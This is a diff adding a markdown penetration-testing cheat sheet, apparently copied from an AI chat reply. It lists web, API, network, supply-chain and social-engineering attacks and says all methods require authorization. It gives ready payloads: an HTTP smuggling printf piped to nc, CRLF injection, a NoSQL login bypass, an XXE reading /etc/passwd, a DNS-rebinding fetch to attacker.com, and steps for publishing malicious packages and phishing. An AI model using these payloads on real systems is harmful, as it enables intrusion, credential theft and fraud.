@@ -1,0 +1,313 @@
+## Web & API Attacks
+
+### 1. HTTP Response/Request Splitting (CRLF Injection / Smuggling)
+
+- **Goal:** Inject headers, smuggle requests.
+- **PoC – Smuggling (with `nc`):**
+    
+    ```bash
+    bash
+    CopyEdit
+    printf "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" \
+      | nc target.com 80
+    
+    ```
+    
+- **CRLF Injection:**
+    
+    ```
+    http
+    CopyEdit
+    GET /?name=foo%0d%0aSet-Cookie:%20admin=1 HTTP/1.1
+    
+    ```
+    
+
+### 2. HTTP Parameter Pollution (HPP)
+
+- **Test:**
+    
+    `GET /search?item=book&item=notebook`
+    
+    → See which is honored: first, last, or merged.
+    
+
+### 3. Open Redirect Variants
+
+- **PoC:**
+    
+    `GET /redirect?url=//evil.com`
+    
+    Or `url=evil.com`
+    
+
+### 4. CORS Misconfiguration
+
+- **Test:**
+    
+    ```bash
+    bash
+    CopyEdit
+    curl -i -H "Origin: https://evil.com" https://target.com/api/data
+    
+    ```
+    
+    → Check if `Access-Control-Allow-Origin: https://evil.com` + `Allow-Credentials: true`
+    
+
+### 5. JWT Manipulation
+
+- **Steps:** Decode token, change `role: user → admin`, set `"alg": "none"`, re-encode, test access.
+
+### 6. NoSQL Injection (e.g. MongoDB)
+
+- **PoC:**
+    
+    ```bash
+    bash
+    CopyEdit
+    curl -X POST https://target/api/login \
+      -H 'Content-Type: application/json' \
+      -d '{"username":{"$ne":null},"password":{"$ne":null}}'
+    
+    ```
+    
+
+### 7. GraphQL Injection
+
+- **PoC:**
+    
+    ```json
+    json
+    CopyEdit
+    { "query": "{ __schema { types { name } } }" }
+    
+    ```
+    
+    → Follow-up: `{ users(where:{role:"ADMIN"}){id,username,passwordHash} }`
+    
+
+### 8. SOAP/XML Injection / XXE
+
+- **XXE Payload:**
+    
+    ```xml
+    xml
+    CopyEdit
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <foo>&xxe;</foo>
+    
+    ```
+    
+- **SOAP test:** Inject `or 1=1` or CDATA for structure abuse.
+
+### 9. Server‑Side Template Injection (SSTI)
+
+- **PoC:**
+    
+    Inject `{{7*7}}` → look for “49” in response.
+    
+    Advanced: `{{config.items()}}`
+    
+
+### 10. Insecure Deserialization
+
+- **Approach:** Find serialized payloads (base64, PHP sessions).
+    - Python: craft pickle payload;
+    - PHP/Java: use ysoserial.
+        
+        → Send via cookie or body. Watch for side effects or RCE.
+        
+
+### 11. Session Fixation / Poisoning
+
+- **Fixation:**
+    1. `curl -c cookies.txt https://target/login`
+    2. Share that session ID; victim logs in, session remains.
+- **Poisoning:**
+    
+    `GET /page.php?login=1&username=admin`
+    
+    → If session or `$_SESSION['username']` becomes “admin.”
+    
+
+### 12. Cross‑Site WebSocket Hijacking & Message Injection
+
+- **Handshake test:**
+    
+    Intercept, change Origin to `evil.com`, see if server accepts.
+    
+- **Message injection:**
+    
+    Send `{"action":"sendMessage", "msg":"<img src=1 onerror=alert(1)>"}`
+    
+- **DoS:** Spam via `ws://` or tools like `wsrepl`.
+
+---
+
+## 🪙 Business Logic & Race Attacks
+
+### 1. Business Logic Flaws
+
+- Duplicate/cancel‑resubmit orders, stack coupons, self-referral abuse.
+- Use Burp/Postman to manipulate workflow endpoints.
+
+### 2. Race Conditions
+
+- Concurrent purchase test:
+    
+    ```bash
+    bash
+    CopyEdit
+    for i in $(seq 1 50); do
+      curl -X POST -b "session=XYZ" https://target.com/purchase -d '{"item":101,"qty":1}'
+    done
+    
+    ```
+    
+- Look for inventory or billing anomalies.
+
+---
+
+## ⚙️ Infrastructure, Network & Config Attacks
+
+### 1. Subdomain Takeover
+
+- Enumerate subdomains; curl each. Look for cloud default errors (S3/GitHub).
+- Missing resource → you can claim the subdomain.
+
+### 2. Reverse Proxy Misconfiguration
+
+- Identify proxied internal domains, curl directly:
+    
+    `curl -I http://internal-api.company.net`
+    
+- Look for exposed dev or debug endpoints.
+
+### 3. HTTP Method Tampering
+
+- Test dangerous verbs:
+    
+    ```bash
+    bash
+    CopyEdit
+    curl -X OPTIONS https://target.com/resource -i
+    curl -X PUT https://target.com/file.txt -d "malicious"
+    curl -X DELETE https://target.com/resource/123
+    
+    ```
+    
+
+### 4. Insecure Cryptography / TLS Misuse
+
+- Check TLS ciphers:
+    
+    `nmap --script ssl-enum-ciphers -p 443 target.com`
+    
+- Spot weak certs with `openssl s_client -connect…`
+
+### 5. DNS Rebinding
+
+- Serve dynamic DNS A‑records (TTL=0). JS fetch internal IP:
+    
+    ```html
+    html
+    CopyEdit
+    <script> fetch('http://attacker.com:8080/admin')… </script>
+    
+    ```
+    
+
+### 6. ARP/DNS Spoofing & BGP Hijacking
+
+- Use tools like ARPspoof to MITM LAN traffic.
+- BGP hijacking requires higher-level access—rare.
+
+---
+
+## 🛠️ Supply‑Chain & DevSecOps Attacks
+
+### 1. Supply Chain — Package Hijacking
+
+- Identify unscoped npm/PyPI packages.
+- Upload malicious version; developer CI runs code at install.
+
+### 2. Container & CI/CD Attacks
+
+- Check Dockerfile for insecure configs.
+- Test ability to run arbitrary commands in CI or container contexts.
+
+---
+
+## ⚠️ Side‑Channel & Physical Attacks
+
+### 1. Timing Attacks & Enumeration
+
+- Detect valid usernames via varying response times:
+    
+    ```bash
+    bash
+    CopyEdit
+    time curl -d "user=admin&pass=wrong" https://target/login
+    time curl -d "user=nonexistent&pass=wrong" https://target/login
+    
+    ```
+    
+
+### 2. Cache Timing / Microarchitectural Attacks
+
+- Advanced, like Flush+Reload, Spectre/Meltdown. Requires low-level testing.
+
+---
+
+## 🕵️‍♂️ Physical & Human‑Focused Threats
+
+### 1. Phishing / Social Engineering / BEC
+
+- Craft targeted emails to elicit credentials or privileged actions.
+
+### 2. Wireless Attacks (KRACK, Evil Twin)
+
+- Create rogue Wi-Fi APs to perform MITM at WPA2 handshake stage.
+
+### 3. IoT & Device Exploits
+
+- Test default credentials; examine pairing protocols, firmware backdoors.
+
+---
+
+## ✅ Quick Reference Table
+
+| Category | Attack | Test Method |
+| --- | --- | --- |
+| Web/API | HTTP smuggling, CRLF injection | `printf … |
+|  | HPP, Open Redirect, CORS misuse | Duplicate params, redirect params, Origin header |
+|  | JWT forging, NoSQL, GraphQL | Modify token, introspection, `$ne` JSON |
+|  | SSTI, Deserialization, XXE | Payloads with `{{ }}`, `base64`, DOCTYPE |
+| Business & Logic | Race conditions, workflow abuse | Concurrent requests, workflow fuzzing |
+| Infrastructure & Network | Proxy / subdomain takeover | curl tests, DNS probing |
+|  | HTTP method tampering | PUT, DELETE, OPTIONS |
+|  | TLS misconfig | `nmap`, `openssl` checks |
+|  | DNS rebinding, spoofing | JS + low-level network tools |
+| Supply‑Chain & DevOps | Dependency hijack, Docker issues | Publish packages, inspect CI |
+| Side‑Channel / Physical | Timing, cache attacks | `time curl`, microarchitectural tests |
+| Human‑Focused | Phishing, wireless MITM | Rogue access points/emails |
+| IoT | Default creds, firmware tests | Scan devices, analyze firmware |
+
+---
+
+## 🧭 To Proceed
+
+- All methods **require authorization and scoped engagement**.
+- Use a combination of **automated (Burp, wfuzz, nmap)** and **manual testing**.
+- Track PoC, request, impact, and remediation per finding.
+
+Let me know if you want:
+
+- Scripts or payload lists
+- Burp templates or Postman collections
+- Environment setups (CI/CD, surrogate domains, service mocks)
+
+Happy to help drill deeper into any of these!
